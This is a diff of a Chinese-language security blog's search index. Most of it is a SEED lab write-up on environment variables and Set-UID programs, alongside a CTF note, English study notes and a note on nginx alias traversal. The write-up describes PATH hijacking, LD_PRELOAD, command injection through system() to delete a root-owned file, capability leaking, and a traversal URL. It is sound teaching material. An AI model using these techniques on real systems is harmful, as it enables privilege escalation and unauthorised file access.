+<p>判断相等的数字个数时，用的是==，这不就是个弱类型漏洞吗，bool类型的true是可以和任何数据弱类型相等的</p>
+<p>抓包刷钱，然后买flag</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211018225202078.png" alt="image-20211018225202078"></p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20211018225228580.png" alt="image-20211018225228580"></p>
 ]]></content>
       <categories>
         <category>web</category>
@@ -2700,6 +2788,259 @@ php反序列化漏洞。
       </categories>
       <tags>
         <tag>Vulnerabilities</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DVWA通关</title>
+    <url>/2021/10/24/DVWA%E9%80%9A%E5%85%B3/</url>
+    <content><![CDATA[<h1 id="DVWA通关"><a href="#DVWA通关" class="headerlink" title="DVWA通关"></a>DVWA通关</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DVWA 是一个入门的 Web 安全学习靶场，说简单也不简单，结合源码去学习的话，不仅可以入门安全也还可以学到不少安全加固的知识</p>
+<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>EnglishSix</title>
+    <url>/2021/09/22/EnglishSix/</url>
+    <content><![CDATA[<h1 id="EnglishSix"><a href="#EnglishSix" class="headerlink" title="EnglishSix"></a>EnglishSix</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>六级在即，学英语</p>
+<h2 id="Words"><a href="#Words" class="headerlink" title="Words"></a>Words</h2><p>背单词时间表（获得网址：<a href="https://17gre.github.io/17GRE/">https://17gre.github.io/17GRE/</a> ）</p>
+<p><img src="/2021/09/22/EnglishSix/image-20210926125114701.png" alt="image-20210926125114701"></p>
+<p>早上学新单词，晚上复习旧单词。</p>
+<h2 id="Reading-Comprehension"><a href="#Reading-Comprehension" class="headerlink" title="Reading Comprehension"></a>Reading Comprehension</h2><p>阅读理解参考书：《杨鹏长难句文字》</p>
+<p><img src="/2021/09/22/EnglishSix/image-20210923144826224.png" alt="image-20210923144826224"></p>
+<p>四种训练方式：</p>
+<ol>
+<li>意群训练。</li>
+<li>不回视训练。</li>
+<li>合理化原则推理训练。</li>
+<li>速度与理解力的平衡点训练。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>English</category>
+      </categories>
+      <tags>
+        <tag>Note</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Environment_Variable_and_SetUID</title>
+    <url>/2021/10/21/SEED_lab1/</url>
+    <content><![CDATA[<h1 id="Environment-Variable-and-SetUID"><a href="#Environment-Variable-and-SetUID" class="headerlink" title="Environment_Variable_and_SetUID"></a>Environment_Variable_and_SetUID</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>在本实验室中，学生将了解环境变量如何工作，如何从父进程传递到子进程，以及它们如何影响系统/程序行为。</p>
+<p>我们特别感兴趣的是环境变量如何影响Set-UID程序（通常是特权程序）的行为。</p>
+<p>本实验室涵盖以下主题：</p>
+<ul>
+<li>Environment variables，环境变量</li>
+<li>Set-UID programs，Set-UID程序</li>
+<li>Securely invoke external programs，安全地调用外部程序</li>
+<li>Capability leaking，权限泄漏</li>
+<li>Dynamic loader/linker，动态加载器/链接器</li>
+</ul>
+<h2 id="Lab-Tasks"><a href="#Lab-Tasks" class="headerlink" title="Lab Tasks"></a>Lab Tasks</h2><h3 id="Taks-1：Manipulating-Environment-Variables，操纵环境变量"><a href="#Taks-1：Manipulating-Environment-Variables，操纵环境变量" class="headerlink" title="Taks 1：Manipulating Environment Variables，操纵环境变量"></a>Taks 1：Manipulating Environment Variables，操纵环境变量</h3><p>在这个任务中，我们研究被用来创建和删除环境变量的命令。</p>
+<p>请做以下的任务：</p>
+<ul>
+<li>使用<code>printenv</code>或者<code>env</code>命令去打印出环境变量。</li>
+<li>使用<code>export</code>和<code>unset</code>命令去创建或者删除环境变量。这两个命令不是程序，是bash自带的内部命令。</li>
+</ul>
+<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ol>
+<li>先用<code>env</code>命令查看环境变量<br><img src="/2021/10/21/SEED_lab1/image-20211020232822008.png" alt="image-20211020232822008"></li>
+<li>然后<code>export sung_lab=test</code>创建一个环境变量，用<code>env | grep sung_lab</code>或者<code>printenv sung_lab</code>命令查看</li>
+<li>最后<code>unset sung_lab</code>删除环境变量<code>sung_lab</code>，同样查看一下<br><img src="/2021/10/21/SEED_lab1/image-20211020233319753.png" alt="image-20211020233319753"></li>
+</ol>
+<h3 id="Task-2：Passing-Environment-Variables-from-Parent-Process-to-Child-Process，传递父进程的环境变量给子进程"><a href="#Task-2：Passing-Environment-Variables-from-Parent-Process-to-Child-Process，传递父进程的环境变量给子进程" class="headerlink" title="Task 2：Passing Environment Variables from Parent Process to Child Process，传递父进程的环境变量给子进程"></a>Task 2：Passing Environment Variables from Parent Process to Child Process，传递父进程的环境变量给子进程</h3><p>在这个任务中，我们研究一个子进程如何从它的父进程得到环境变量。</p>
+<p>我们想知道是否父进程的环境变量会被子进程继承。</p>
+<h4 id="Step-1-请运行myprintenv-c程序，并描述你看到的现象。"><a href="#Step-1-请运行myprintenv-c程序，并描述你看到的现象。" class="headerlink" title="Step 1. 请运行myprintenv.c程序，并描述你看到的现象。"></a>Step 1. 请运行myprintenv.c程序，并描述你看到的现象。</h4><ol>
+<li><p>使用<code>gcc myprintenv.c</code>命令编译它，生成<code>a.out</code>二进制程序。</p>
+</li>
+<li><p>使用<code>a.out &gt; file</code>运行这个二进制程序并将结果保存到<code>file</code>文件。</p>
+<p><img src="/2021/10/21/SEED_lab1/image-20211021082901997.png" alt="image-20211021082901997"><br><img src="/2021/10/21/SEED_lab1/image-20211021084800668.png" alt="image-20211021084800668"><br><img src="/2021/10/21/SEED_lab1/image-20211021084917107.png" alt="image-20211021084917107"><br><img src="/2021/10/21/SEED_lab1/image-20211021085010998.png" alt="image-20211021085010998"></p>
+</li>
+<li><p>现象：我们看到<code>a.out</code>像<code>env</code>命令一样输出了环境变量，我们查看源码知道，这里输出的是<code>fork()</code>创建出的子进程的环境变量。</p>
+</li>
+</ol>
+<h4 id="Step-2-注释子进程的printenv-函数，取消注释父进程的printenv-函数并重新编译运行保存结果。"><a href="#Step-2-注释子进程的printenv-函数，取消注释父进程的printenv-函数并重新编译运行保存结果。" class="headerlink" title="Step 2. 注释子进程的printenv()函数，取消注释父进程的printenv()函数并重新编译运行保存结果。"></a>Step 2. 注释子进程的printenv()函数，取消注释父进程的printenv()函数并重新编译运行保存结果。</h4><ol>
+<li>修改文件<br><img src="/2021/10/21/SEED_lab1/image-20211021084533013.png" alt="image-20211021084533013"></li>
+<li>重新编译运行，保存结果到<code>file2</code><br><img src="/2021/10/21/SEED_lab1/image-20211021085304578.png" alt="image-20211021085304578"><br><img src="/2021/10/21/SEED_lab1/image-20211021085335272.png" alt="image-20211021085335272"><br><img src="/2021/10/21/SEED_lab1/image-20211021085425404.png" alt="image-20211021085425404"><br><img src="/2021/10/21/SEED_lab1/image-20211021085456050.png" alt="image-20211021085456050"></li>
+<li>现象：我们看到<code>a.out</code>输出了环境变量，我们之前修改源码，<code>switch</code>中将子进程的<code>printenv()</code>注释的同时将父进程的<code>printenv()</code>取消注释，所以这里输出的是父进程的环境变量。</li>
+</ol>
+<h4 id="Step-3-使用diff命令比较两个文件内容的不同。得出你的结论。"><a href="#Step-3-使用diff命令比较两个文件内容的不同。得出你的结论。" class="headerlink" title="Step 3. 使用diff命令比较两个文件内容的不同。得出你的结论。"></a>Step 3. 使用diff命令比较两个文件内容的不同。得出你的结论。</h4><p><img src="/2021/10/21/SEED_lab1/image-20211021090547419.png" alt="image-20211021090547419"></p>
+<p>结论：我们看到父进程和子进程打印的环境变量没有不同，所以得出结论，子进程会完整地继承父进程的环境变量。</p>
+<h3 id="Task-3：Environment-Variables-and-execve-，环境变量和execve-函数"><a href="#Task-3：Environment-Variables-and-execve-，环境变量和execve-函数" class="headerlink" title="Task 3：Environment Variables and execve()，环境变量和execve()函数"></a>Task 3：Environment Variables and execve()，环境变量和execve()函数</h3><p>在这个任务中，我们研究当一个新程序被通过<code>execve()</code>函数执行的时候，环境变量是如何被影响的。</p>
+<p>基本上，<code>execve()</code>函数在调用进程中运行新程序。</p>
+<p>我们对环境变量发生了什么感兴趣，他们是否会被新程序自动继承？    </p>
+<h4 id="Step-1-编译并运行myenv-c程序，描述你看到的现象。"><a href="#Step-1-编译并运行myenv-c程序，描述你看到的现象。" class="headerlink" title="Step 1. 编译并运行myenv.c程序，描述你看到的现象。"></a>Step 1. 编译并运行myenv.c程序，描述你看到的现象。</h4><p>程序简单地执行了<code>/usr/bin/env</code>程序，这个程序会打印当前进程的环境变量。</p>
+<p><img src="/2021/10/21/SEED_lab1/image-20211021092417939.png" alt="image-20211021092417939"></p>
+<p>很奇怪，没有环境变量输出。</p>
+<h4 id="Step-2-修改execve-函数调用的参数，描述你看到的现象。"><a href="#Step-2-修改execve-函数调用的参数，描述你看到的现象。" class="headerlink" title="Step 2. 修改execve()函数调用的参数，描述你看到的现象。"></a>Step 2. 修改execve()函数调用的参数，描述你看到的现象。</h4><ol>
+<li>修改第三个参数<code>NULL</code>为<code>environ</code>，如图所示：<br><img src="/2021/10/21/SEED_lab1/image-20211021093119656.png" alt="image-20211021093119656"></li>
+<li>重新编译运行，查看结果<br><img src="/2021/10/21/SEED_lab1/image-20211021093436697.png" alt="image-20211021093436697"><br><img src="/2021/10/21/SEED_lab1/image-20211021093519126.png" alt="image-20211021093519126"></li>
+<li>我们可以看到，这次正确输出了环境变量</li>
+</ol>
+<h4 id="Step-3-关于新程序如何得到它的环境变量，请给出你的结论"><a href="#Step-3-关于新程序如何得到它的环境变量，请给出你的结论" class="headerlink" title="Step 3. 关于新程序如何得到它的环境变量，请给出你的结论"></a>Step 3. 关于新程序如何得到它的环境变量，请给出你的结论</h4><p>通过<code>execve()</code>等函数运行新程序，可以在参数里指定环境变量指针来对新程序设置环境变量。</p>
+<p>这也正是step 1和 step 2结果有差异的原因</p>
+<p>step 1设置新程序环境变量指针为空，所以新程序没有得到环境变量，也就没有输出; </p>
+<p>step 2中设置了环境变量，所以新程序得到环境变量，所以有输出。</p>
+<h3 id="Task-4：Environment-Variables-and-system-，环境变量和system-函数"><a href="#Task-4：Environment-Variables-and-system-，环境变量和system-函数" class="headerlink" title="Task 4：Environment Variables and system()，环境变量和system()函数"></a>Task 4：Environment Variables and system()，环境变量和system()函数</h3><p>在这个任务中，我们研究当一个新程序被通过<code>system()</code>函数执行的时候，环境变量如何被影响。</p>
+<p><code>system()</code>实际上执行<code>/bin/sh</code>，并请求shell去执行命令。</p>
+<p><code>system()</code>先使用<code>execl()</code>函数去执行<code>/bin/sh</code>，<code>execl()</code>调用<code>execve()</code>，传递给它环境变量数组。</p>
+<p>因此，使用<code>system()</code>函数，调用进程的环境变量被传递给新程序<code>/bin/sh</code></p>
+<p>请编译并运行如下程序去验证这个结论。</p>
+<h4 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h4><ol>
+<li>编辑一个<code>verify.c</code>程序，文件内容如下：<br><img src="/2021/10/21/SEED_lab1/image-20211021101703340.png" alt="image-20211021101703340"></li>
+<li>编译并运行，查看结果<br><img src="/2021/10/21/SEED_lab1/image-20211021101929315.png" alt="image-20211021101929315"><br><img src="/2021/10/21/SEED_lab1/image-20211021102001671.png" alt="image-20211021102001671"></li>
+<li>可以看到输出了环境变量。说明环境变量从调用进程传给了<code>/bin/sh</code>，再从<code>/bin/sh</code>传给了子进程<code>env</code>。</li>
+</ol>
+<h3 id="Task-5：Environment-Variable-and-Set-UID-Programs，环境变量和Set-UID程序"><a href="#Task-5：Environment-Variable-and-Set-UID-Programs，环境变量和Set-UID程序" class="headerlink" title="Task 5：Environment Variable and Set-UID Programs，环境变量和Set-UID程序"></a>Task 5：Environment Variable and Set-UID Programs，环境变量和Set-UID程序</h3><p>Set-UID是Unix操作系统一种重要的安全机制。当一个Set-UID程序运行时，它假使程序所属用户的权限。</p>
+<p>例如，如果一个程序的所属用户是root，那么当任何人去运行它，在调用过程中这个程序都会获得root权限。</p>
+<p>Set-UID允许我们去做很多有趣的事情，但由于它升级了当前用户的特权，它是相当危险的。</p>
+<p>尽管Set-UID程序的行为被程序逻辑所决定，而不是用户，但是用户确实能通过改变环境变量去影响它的行为。</p>
+<p>为了理解Set-UID如何被影响，让我们搞清楚Set-UID程序的进程是否会继承当前用户进程的环境变量。</p>
+<h4 id="Step-1-编写以下程序，它能打印出当前进程的环境变量。"><a href="#Step-1-编写以下程序，它能打印出当前进程的环境变量。" class="headerlink" title="Step 1. 编写以下程序，它能打印出当前进程的环境变量。"></a>Step 1. 编写以下程序，它能打印出当前进程的环境变量。</h4><p><img src="/2021/10/21/SEED_lab1/image-20211021105132343.png" alt="image-20211021105132343"></p>
+<h4 id="Step-2-编译以上程序，改变所属用户，并使它成为一个Set-UID程序。"><a href="#Step-2-编译以上程序，改变所属用户，并使它成为一个Set-UID程序。" class="headerlink" title="Step 2. 编译以上程序，改变所属用户，并使它成为一个Set-UID程序。"></a>Step 2. 编译以上程序，改变所属用户，并使它成为一个Set-UID程序。</h4><p><img src="/2021/10/21/SEED_lab1/image-20211021105539178.png" alt="image-20211021105539178"></p>
+<h4 id="Step-3-你需要用非root用户去设置以下环境变量（它可能已经存在）"><a href="#Step-3-你需要用非root用户去设置以下环境变量（它可能已经存在）" class="headerlink" title="Step 3. 你需要用非root用户去设置以下环境变量（它可能已经存在）"></a>Step 3. 你需要用非root用户去设置以下环境变量（它可能已经存在）</h4><ul>
+<li>PATH</li>
+<li>LD_LIBRARY_PATH</li>
+<li>ANY_NAME （这是由你定义的环境变量，因此选择你想要的名字）</li>
+</ul>
+<p>这些环境变量设置在当前用户的shell进程。</p>
+<p>现在，运行Step 2创建的Set-UID程序。请检查你在shell进程（父进程）所设置的所有的环境变量是否都进入了Set-UID子进程。</p>
+<p>描述你的观察。如果遇到令人惊讶的现象，描述他们。</p>
+<ol>
+<li>查看这三个环境变量的值，发现只有PATH存在。<br><img src="/2021/10/21/SEED_lab1/image-20211021111121776.png" alt="image-20211021111121776"></li>
+<li>设置这两个不存在的环境变量和已经存在的变量PATH<br><img src="/2021/10/21/SEED_lab1/image-20211021111652449.png" alt="image-20211021111652449"></li>
+<li>我们运行Step 2生成的<code>foo</code>程序，查看我们设置的三个环境变量<br><img src="/2021/10/21/SEED_lab1/image-20211021112224792.png" alt="image-20211021112224792"></li>
+<li>我们发现<code>LD_LIBRARY_PATH</code>并没有进入Set-UID子进程，进一步查看差异<br><img src="/2021/10/21/SEED_lab1/image-20211021112921464.png" alt="image-20211021112921464"></li>
+<li>我们发现除了LD_LIBRARY_PATH环境变量外，只有<code>_</code>变量不同。</li>
+</ol>
+<p>可以看到输出的环境变量中包含PATH 和 ANY_NAME，且环境变量PATH为我们修改后的值。但其中没有我们用 export 命令设置的环境变量LD_LIBRARY_PATH。这个出乎意外，按道理说用 export 设置的都会进入子程序的环境变量。</p>
+<p>其实这是一种动态链接器的保护策略，因为这个程序用到了动态链接库。</p>
+<p>因为我们是在普通用户的状态下修改 LD_LIBRARY_PATH，如果这个修改能传递到 set-uid 程序中，那么我们就能通过修改 LD_LIBRARY_PATH 来改变 set-uid程序的库的寻找位置来实施攻击。</p>
+<p>因此动态链接器在 effective uid 和 real uid不一致 或者 effective groupid 和 real groupid不一致时，会将 LD_LIBRARY_PATH 和 LD_PRELOAD 环境变量忽略掉，所以子进程是看不到的。</p>
+<p>而其他的环境变量动态链接器没有使用到，因此也不会去干涉，所以子进程能够得到。</p>
+<h3 id="Task-6：The-PATH-Environment-Variable-and-Set-UID-Programs，PATH环境变量和Set-UID程序"><a href="#Task-6：The-PATH-Environment-Variable-and-Set-UID-Programs，PATH环境变量和Set-UID程序" class="headerlink" title="Task 6：The PATH Environment Variable and Set-UID Programs，PATH环境变量和Set-UID程序"></a>Task 6：The PATH Environment Variable and Set-UID Programs，PATH环境变量和Set-UID程序</h3><p>因为shell程序被调用，在Set-UID程序里调用<code>system()</code>函数是相当危险的。</p>
+<p>这是因为shell程序的真实行为会被环境变量影响，像是$PATH变量，这些环境变量是由用户提供的，而用户可能是恶意的。</p>
+<p>通过改变这些环境变量，恶意用户可以控制Set-UID程序的行为。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>请编译以上程序，改变程序所属用户为root，并且让它成为一个Set-UID程序。</p>
+<p>使用Set-UID程序去执行你的恶意代码，描述并解释你观察的现象。</p>
+<h4 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h4><ol>
+<li><p>先准备一个Set-UID程序，我们现在得到一个Set-UID程序<code>myls</code><br><img src="/2021/10/21/SEED_lab1/image-20211021144813929.png" alt="image-20211021144813929"></p>
+</li>
+<li><p>修改环境变量PATH，增加/home/seed/Desktop/Labsetup目录，我们将在这个目录下面存放恶意程序<br><img src="/2021/10/21/SEED_lab1/image-20211021152009796.png" alt="image-20211021152009796"></p>
+</li>
+<li><p>以id命令为例，将id文件更名为ls放在/home/seed/Desktop/Labsetup目录下面，当我们执行myls文件，不再调用ls而是名为ls的id命令。<br><img src="/2021/10/21/SEED_lab1/image-20211021152108820.png" alt="image-20211021152108820"></p>
+</li>
+</ol>
+<p>程序 id 是Set-UID程序运行的，按理说应该也有 root 权限，但从程序 id 的输出来看，其并没有获得 root 权限。</p>
+<p>这是因为Ubuntu 20.04 VM，/bin/bash实际上是指向/bin/dash的符号链接。 </p>
+<p>/bin/dash 中有一个对策，当它发现自己自己在一个Set-UID程序中执行时，它会把有效用户ID（root）改成当前进程的真实用户ID（seed）, 也就是放弃了特权，所以攻击失败。</p>
+<p>SEED_Ubuntu有一个叫做zsh的shell程序，我们可以使用一下命令链接/bin/sh到/bin/zsh：</p>
+<p><code>sudo ln -sf /bin/zsh /bin/sh</code></p>
+<p>再次执行，结果如下所示： </p>
+<p><img src="/2021/10/21/SEED_lab1/image-20211021153534901.png" alt="image-20211021153534901"></p>
+<h3 id="Task-7：The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs，LD-PRELOAD环境变量和Set-UID程序"><a href="#Task-7：The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs，LD-PRELOAD环境变量和Set-UID程序" class="headerlink" title="Task 7：The LD_PRELOAD Environment Variable and Set-UID Programs，LD_PRELOAD环境变量和Set-UID程序"></a>Task 7：The LD_PRELOAD Environment Variable and Set-UID Programs，LD_PRELOAD环境变量和Set-UID程序</h3><p>在本任务中，我们研究Set-UID程序如何处理一些环境变量。</p>
+<p>一些环境变量，包括LD_PRELOAD、LD_LIBRARY_PATH和其他会影响动态加载器/连接器行为的LD_*环境变量。</p>
+<p>动态加载器/链接器是操作系统（OS）的一部分，它在运行时加载（从持久存储到RAM）和链接可执行文件所需的共享库。</p>
+<p>在Linux中，ld.so或ld-Linux.so是动态加载器/链接器（每个都用于不同类型的二进制文件）。在影响其行为的环境变量中，我们在本次试验中关注LD_LIBRARY_PATH和LD_PRELOAD。</p>
+<p>在Linux中，LD_LIBRARY_PATH是一组以冒号分隔的目录，在其中首先搜索库，然后搜索标准目录集。</p>
+<p>LD_PRELOAD指定要在所有其他库之前加载的其他用户指定共享库的列表。</p>
+<p>在本任务中，我们将只研究LD_PRELOAD。</p>
+<h4 id="Step-1-首先，我们要理解当运行一个普通程序时，环境变量是如何影响这些动态加载器-链接器。"><a href="#Step-1-首先，我们要理解当运行一个普通程序时，环境变量是如何影响这些动态加载器-链接器。" class="headerlink" title="Step 1. 首先，我们要理解当运行一个普通程序时，环境变量是如何影响这些动态加载器/链接器。"></a>Step 1. 首先，我们要理解当运行一个普通程序时，环境变量是如何影响这些动态加载器/链接器。</h4><ol>
+<li>我们先建立一个动态链接库，创建<code>mylib.c</code>，它覆盖了libc的<code>sleep()</code>函数<br><img src="/2021/10/21/SEED_lab1/image-20211021155829901.png" alt="image-20211021155829901"></li>
+<li>我们可以使用以下命令编译上述程序<br><img src="/2021/10/21/SEED_lab1/image-20211021161341297.png" alt="image-20211021161341297"></li>
+<li>现在，设置LD_PRELOAD环境变量：<br><img src="/2021/10/21/SEED_lab1/image-20211021161442505.png" alt="image-20211021161442505"></li>
+<li>最后，编译下面的程序myprog，并在与上面动态链接库libmylib.so.1.0.1相同的目录下<br><img src="/2021/10/21/SEED_lab1/image-20211021161714670.png" alt="image-20211021161714670"></li>
+</ol>
+<h4 id="Step-2-完成上述操作后，请在以下条件下运行myprog，并观察发生的情况"><a href="#Step-2-完成上述操作后，请在以下条件下运行myprog，并观察发生的情况" class="headerlink" title="Step 2. 完成上述操作后，请在以下条件下运行myprog，并观察发生的情况"></a>Step 2. 完成上述操作后，请在以下条件下运行myprog，并观察发生的情况</h4><ul>
+<li>使myprog成为一个普通程序，运行它作为一个普通用户<br><img src="/2021/10/21/SEED_lab1/image-20211021162603277.png" alt="image-20211021162603277"><br>现象：执行我们覆盖的sleep()函数，输出 i am not sleeping!</li>
+<li>使myprog成为一个Set-UID root程序，运行它作为一个普通用户<br><img src="/2021/10/21/SEED_lab1/image-20211021163126750.png" alt="image-20211021163126750"><br>现象：等待一秒后结束，无输出</li>
+<li>使myprog成为一个Set-UID root程序，作为root用户再一次改变LD_PRELOAD环境变量的值，运行它。<br><img src="/2021/10/21/SEED_lab1/image-20211021163339271.png" alt="image-20211021163339271"><br>现象：执行我们覆盖的sleep()函数，输出 i am not sleeping!</li>
+<li>使myprog成为一个Set_UID user1程序，在另一个用户帐户（非root用户）中再次改变LD_PRELOAD环境变量并运行它<br><img src="/2021/10/21/SEED_lab1/image-20211021163940025.png" alt="image-20211021163940025"><br>现象：等待一秒后结束，无输出</li>
+</ul>
+<h4 id="Step-3-分析上述结果不同的原因"><a href="#Step-3-分析上述结果不同的原因" class="headerlink" title="Step 3. 分析上述结果不同的原因"></a>Step 3. 分析上述结果不同的原因</h4><p>造成不同结果的关键在于 LD_PRELOAD 环境变量有没有被动态连接器屏蔽，LD_PRELOAD 和 LD_LIBRARY_PATH 类似，具体机制可以查看上面 Task 5 及其分析。</p>
+<p>对于第一种情况，euid等于uid，均为seed，LD_PRELOAD 环境变量没有被屏蔽，所以链接的是 libmylib.so.1.0.1，输出一句话</p>
+<p>对于第二种情况，euid为root，uid为seed，不相同，LD_PRELOAD 环境变量被屏蔽，从标准路径查找链接库，所以链接的是标准库。所以结果为等待一秒后结束，无输出。</p>
+<p>对于第三种情况，euid 等于uid，均为 root，LD_PRELOAD 环境变量没有被屏蔽，所以链接的是 libmylib.so.1.0.1，输出一句话</p>
+<p>对于第四种情况，euid为uer1，uid为seed，不相同，LD_PRELOAD 环境变量被屏蔽，从标准路径查找链接库，所以链接的是标准库。所以结果为等待一秒后结束，无输出。</p>
+<h3 id="Task-8：Invoking-External-Programs-Using-system-versus-execve-，使用system-和execve-函数调用外部程序"><a href="#Task-8：Invoking-External-Programs-Using-system-versus-execve-，使用system-和execve-函数调用外部程序" class="headerlink" title="Task 8：Invoking External Programs Using system() versus execve()，使用system()和execve()函数调用外部程序"></a>Task 8：Invoking External Programs Using system() versus execve()，使用system()和execve()函数调用外部程序</h3><p>尽管<code>system()</code>和<code>execve()</code>函数都被用来去运行一个新程序，但是因为环境变量可以影响shell的工作，所以<code>system()</code>函数要危险得多，例如Set-UID程序中使用。<code>execve()</code>没有这个问题，因为它不调用shell。</p>
+<p>调用shell还有另一个危险的后果，这次与环境变量无关。</p>
+<h4 id="Step-1-编译catall程序并让它成为一个Set-root-UID程序，程序将使用system-函数调用命令。"><a href="#Step-1-编译catall程序并让它成为一个Set-root-UID程序，程序将使用system-函数调用命令。" class="headerlink" title="Step 1. 编译catall程序并让它成为一个Set-root-UID程序，程序将使用system()函数调用命令。"></a>Step 1. 编译catall程序并让它成为一个Set-root-UID程序，程序将使用system()函数调用命令。</h4><p>如果你是Bob，你能否删除一个不可写的文件？</p>
+<ol>
+<li><p>编译程序，并设置为Set-root-UID程序<br><img src="/2021/10/21/SEED_lab1/image-20211021170716399.png" alt="image-20211021170716399"></p>
+</li>
+<li><p>实施一个删除文件攻击, 用 root 账户在 /root 目录下新建一个文件example， 然后切换到 seed 账户，可以看到无法访问也无法删除该文件。<br><img src="/2021/10/21/SEED_lab1/image-20211021171009166.png" alt="image-20211021171009166"></p>
+</li>
+<li><p>在第一条命令执行后，继续执行恶意命令，成功删除example文件<br><img src="/2021/10/21/SEED_lab1/image-20211021171522720.png" alt="image-20211021171522720"><br><img src="/2021/10/21/SEED_lab1/image-20211021171442550.png" alt="image-20211021171442550"></p>
+</li>
+</ol>
+<h4 id="Step-2-将step-1中的调用system函数改成调用execve，重复上面的流程。"><a href="#Step-2-将step-1中的调用system函数改成调用execve，重复上面的流程。" class="headerlink" title="Step 2. 将step 1中的调用system函数改成调用execve，重复上面的流程。"></a>Step 2. 将step 1中的调用system函数改成调用execve，重复上面的流程。</h4><p><img src="/2021/10/21/SEED_lab1/image-20211021171828008.png" alt="image-20211021171828008"></p>
+<p><img src="/2021/10/21/SEED_lab1/image-20211021172024896.png" alt="image-20211021172024896"></p>
+<p>可以发现，运行报错并且未删除该文件</p>
+<p>分析：在使用system函数时，最终是shell去执行命令，而且未仔细检查用户输入，使得其执行了两条命令。其中第二条命令为恶意构造的命令，删除了文件。改成使用execve之后，这种攻击方式是不会成功的，因为它是通过系统调用的方式去执行，只能执行一个进程，且进程名已指定，不会产生这种漏洞。</p>
+<h3 id="Task-9：Capability-Leaking，权限泄漏"><a href="#Task-9：Capability-Leaking，权限泄漏" class="headerlink" title="Task 9：Capability Leaking，权限泄漏"></a>Task 9：Capability Leaking，权限泄漏</h3><p><img src="/2021/10/21/SEED_lab1/image-20211021172835747.png" alt="image-20211021172835747"></p>
+<p>先用 root 权限创建 /etc/zzz 文件。然后编译上面代码，并设置为Set-root-UID程序。</p>
+<p>使用普通账户运行该程序发现等了一秒，无输出。查看 /etc/zzz 可以发现文件内容已经被修改。</p>
+<p><img src="/2021/10/21/SEED_lab1/image-20211021201721022.png" alt="image-20211021201721022"><br><img src="/2021/10/21/SEED_lab1/image-20211021201807244.png" alt="image-20211021201807244"></p>
+<p><strong>原因分析：</strong>这个特权程序打开了一个重要的的系统文件，并且在放弃特权时没有关闭该文件，而后调用Fork，子进程会继承这个文件描述符，造成特权泄露。子进程可以通过泄露的文件描述符向文件写入恶意内容</p>
+]]></content>
+      <categories>
+        <category>软件安全</category>
+      </categories>
+      <tags>
+        <tag>课程作业</tag>
+        <tag>Lab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2021/10/24/sql/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>web相关知识</title>
+    <url>/2021/10/11/web%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<h1 id="web相关知识"><a href="#web相关知识" class="headerlink" title="web相关知识"></a>web相关知识</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对web相关知识的整理，包括自己熟悉的和不熟悉的。</p>
+<h2 id="Broken-Access-Control，越权访问"><a href="#Broken-Access-Control，越权访问" class="headerlink" title="Broken Access Control，越权访问"></a>Broken Access Control，越权访问</h2><h2 id="Cryptographic-Failures，加密失败"><a href="#Cryptographic-Failures，加密失败" class="headerlink" title="Cryptographic Failures，加密失败"></a>Cryptographic Failures，加密失败</h2><h2 id="Injection，注入"><a href="#Injection，注入" class="headerlink" title="Injection，注入"></a>Injection，注入</h2><h2 id="Insecure-Design，不安全的设计"><a href="#Insecure-Design，不安全的设计" class="headerlink" title="Insecure Design，不安全的设计"></a>Insecure Design，不安全的设计</h2><h2 id="Security-Misconfiguration，安全配置错误"><a href="#Security-Misconfiguration，安全配置错误" class="headerlink" title="Security Misconfiguration，安全配置错误"></a>Security Misconfiguration，安全配置错误</h2><h3 id="niginx配置不当导致的目录穿越"><a href="#niginx配置不当导致的目录穿越" class="headerlink" title="niginx配置不当导致的目录穿越"></a>niginx配置不当导致的目录穿越</h3><p>Nginx在配置别名（Alias）的时候，如果忘记加<code>/</code>，将造成一个目录穿越漏洞。</p>
+<p>修改<code>nginx.conf</code>，添加如下配置：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">location /file &#123;</span><br><span class="line">alias /var/www/html/example/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在如下配置中设置目录别名时<code>/file</code>配置为<code>/var/www/html/example/</code>的别名，</p>
+<p>那么当我们访问<code>/file../</code>时,nginx实际处理的路径时<code>/var/www/html/example/../</code>也就是<code>/var/www/html/</code>，从而实现了穿越目录。</p>
+<p>访问<code>http://test.com/file../sql.conf</code>，会返回服务器上<code>/var/www/html/sql.conf</code>的内容</p>
